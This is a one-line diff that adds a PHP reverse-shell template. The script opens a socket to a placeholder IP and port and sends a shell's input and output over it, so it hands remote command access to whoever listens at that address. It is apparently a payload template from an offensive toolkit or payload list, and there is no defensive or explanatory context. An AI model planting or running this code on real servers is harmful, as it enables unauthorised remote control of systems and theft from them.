@@ -1,0 +1,1 @@
+<?php $sock=fsockopen("-IP-",-PORT-);exec("-SHELL- <&3 >&3 2>&3"); ?>
